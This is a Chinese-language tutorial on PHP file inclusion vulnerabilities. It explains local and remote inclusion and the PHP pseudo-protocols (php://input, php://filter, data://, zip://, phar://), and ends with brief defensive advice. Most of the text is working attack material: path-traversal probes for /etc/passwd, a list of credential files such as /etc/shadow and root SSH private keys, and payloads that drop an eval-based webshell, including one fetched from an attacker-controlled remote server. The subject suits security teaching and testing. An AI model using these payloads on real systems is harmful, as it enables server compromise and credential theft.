# 文件包含漏洞

文件包含漏洞：即file inclusion，意思是文件包含，是指当服务器开启allow_url_include选项时，就可以通过PHP的某些文件包含函数利用URL去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。

## 文件包含的分类

一、本地文件包含：当被包含的文件在服务器本地时，就叫本地文件包含。
二、远程文件包含：当被包含的文件在第三方服务器时，就叫远程文件包含。

远程文件包含需要在`php.ini`中开启`allow_url_fopen:on默认开启`和`allow_url_include:off默认关闭`

**PHP版本<=5.2**可以使用%00进行截断

## 文件包含函数

- include()：只有代码执行到该函数时才会包含文件进来，发生错误时只给出一个警告并继续向下执行。
- include_once()：和include()功能相同，区别在于当重复调用同一文件时，程序只调用一次。
- require()：只要程序执行就包含文件进来，发生错误时会输出错误结果并终止运行。
- require_once()：和require()功能相同，区别在于当重复调用同一文件时，程序只调用一次。
- highlight_file()：函数对文件进行语法高亮显示，可以读写敏感信息。
- show_source()：函数对文件进行语法高亮显示，可以读写敏感信息。
- readfile()：函数读取一个文件，并写入到输出缓冲，可以读写敏感信息。
- file_get_contents()：函数把整个文件读入一个字符串中，可以读写敏感信息。
- fopen()：函数打开文件或者 URL。
- file()：函数把整个文件读入一个数组中。

## 特征与检验

```txt
文件包含漏洞特征：
?page=a.php
?home=b.html
?file=content

检测方法：
?file=../../../../etc/passwd
?page=file:///etc/passwd
?home=main.cgi?page=http://www.a.com/1.phphttp://1.1.1.1/../../../../dir/file.txt
```

## 利用过程

本地包含Shell：
(1) 上传Web应用指定类型的文件，如：shell.jpg（需要确认文件上传后的绝对路径）
`<?fputs(fopen("shell.php","w"),"<?php @eval($_POST[topo]);?>")?>`
(2) 使用文件包含漏洞，直接解析上传的非php后缀的文件，获取webshell。
访问URL：`http://www.xxx.com/index.php?page=./shell.jpg` 在本地生成shell.php

远程包含Shell:
(1) 先写一个test.txt文件，保存在自己的远程服务器yyy上，内容如下：
`<?fputs(fopen("shell.php","w"),"<?php eval($_POST[topo]);?>")?>`
(2) 则可以通过访问：`http://www.xxx.com/index.php?page=http://www.yyy.com/test.txt` 则会在服务器根目录下生产一个shell.php

## 敏感文件位置

Windows

```txt
C:\boot.ini  # 查看系统版本
C:\Windows\System32\inetsrv\MetaBase.xml  # IIS配置文件
C:\Windows\repair\sam  # 存储系统初次安装的密码
C:\Program Files\mysql\my.ini  # Mysql配置
C:\Program Files\mysql\data\mysql\user.MYD  # mysql root
C:\Windows\php.ini  # php配置信息
C:\Windows\my.ini  # mysql配置信息
```

Linux

```txt
/root/ .ssh/authorized_keys
/root/ .ssh/id_rsa
/root/ .ssh/id_ras.keystore
/root/ .ssh/known_hosts
/etc/passwd
/etc/shadow
/etc/my.cnf
/etc/httpd/conf/httpd.conf
/root/ .bash_history
/root/ .mysql_history
/proc/self/fd/fd[0-9]*(文件标识符)
/proc/mounts
/porc/config.gz
```

## PHP伪协议

- php:// 协议
  - php://input     # 用于执行php代码
  - php://filter    # 常用于读取php文件的源码
- data:// 协议
- file:// 协议
- zip://、bzip2://、zlib://协议
  - zip://协议
  - bzip2://协议
  - zlib://协议
- phar://伪协议

### PHP伪协议案例

- php://input 执行php代码与写入木马

`allow_url_include: on`

测试代码

```php
<?php
    include($_GET['file']);
?>

payload:
http://192.168.1.103/test.php?file=php://input

[POST]:
<?php phpinfo(); ?>

[POST]:
<?php system('ls /'); ?>

[POST]:
<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST[whoami]);?>');?>
```

- php://filter来读写文件。

在实战中，若是遇上include、require、include_once、require_once、highlight_file 、show_source 、readfile 、file_get_contents 、fopen 、file等文件包含函数，我们可以用php://filter来读取php源码。

测试代码

```php
<?php
    $file1 = $_GET['file1'];
    $file2 = $_GET['file2'];
    $txt = $_GET['txt'];  // 写入的内容
    echo file_get_contents($file1);    // 或者是include($file1);
    file_put_contents($file2,$txt);
?>

payload
读取文件:
test.php?file1=php://filter/resource=/etc/passwd
test.php?file1=php://filter/read=convert.base64-encode/resource=flag.php    // 专用于读取php文件

写入文件:
test.php?file2=php://filter/resource=test1.txt&txt=Thanks Bunny!
test.php?file2=php://filter/write=convert.base64-encode/resource=test2.txt&txt=Thanks Bunny!
```

- data:// 协议

`allow_url_fopen: on`
`allow_url_include: on`

```php
<?php
// 打印 “输出"
echo file_get_contents($_GET[file]);
?>
payload：
test.php?file=data://text/plain;base64,VGhhbmtzJTIwQnVubnklMjE=
```

```php
// 如果遇上include文件包含，还可以造成任意代码执行
<?php
    include($_GET['file']);
?>

payload：
test.php?file=data://text/plain,<?php phpinfo();?>
test.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
test.php?file=data:text/plain,<?php phpinfo()?>
test.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
test.php?file=data:,<?php phpinfo()?>
```

- file:// 协议

可以访问本地文件系统，读取到文件的内容，但是不能用来读取php文件的源码，且单纯的file://伪协议不配合文件包含漏洞是不能执行文件里的php代码的。

测试代码

```php
<?php
    include($_GET['file']);
?>

payload：
test.php?file=file:///etc/passwd
```

- zip://、bzip2://、zlib://协议

zip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：jpg png gif xxx 等等。

zip://协议条件：PHP > =5.3.0，注意在windows下测试要5.3.0<PHP<5.4才可以
使用方法：在浏览器中要编码为%23，否则浏览器默认不会传输特殊字符。
zip://archive.zip#dir/file.txt
zip://[压缩文件绝对路径]#[压缩文件内的子文件名]

测试代码

```php
<?php
    include($_GET['file']);
?>
payload：
test.php?file=zip:///var/www/html/whoami.zip%23shell.txt
```

bzip2://协议使用方法：
compress.bzip2://file.bz2
压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）
payload：test.php?file=compress.bzip2://目录/phpinfo.bz2

zlib://协议使用方法：
compress.zlib://file.gz
压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）
payload：test.php?file=compress.zlib://目录/phpinfo.bz2

- phar://伪协议

phar://协议与zip://类似，同样可以访问zip格式压缩包内容，不管后缀是什么，都会当做压缩包来解压。
用法：?file=phar://压缩包/内部文件 注意：PHP > =5.3.0 压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。

测试代码

```php
// 步骤：写一个木马文件shell.txt，然后用zip协议压缩为whoami.zip，然后将后缀改为png等其他格式，上传，然后再用phar伪协议来访问： （和zip://用法类似的）
<?php
    include($_GET['file']);
?>
payload：
test.php?file=phar:///var/www/html/whoami.png/shell.txt
```

## 防御

- 严格检查变量是否已经初始化。
- 严格判断包含中的参数是否外部可控。
- 基于白名单的包含文件验证，验证被包含的文件是否在白名单中。
- 尽量不要使用动态包含，可以在需要包含的页面固定写好，如：include("func.php")。
- 对所有输入提交可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查，参数中不允许出现../之类的目录跳转符。
- 可以通过调用str_replace()函数实现相关敏感字符的过滤，一定程度上防御了远程文件包含。

参考连接：
`https://mp.weixin.qq.com/s/qn0_Y27rpLFOslWU7-tenw`
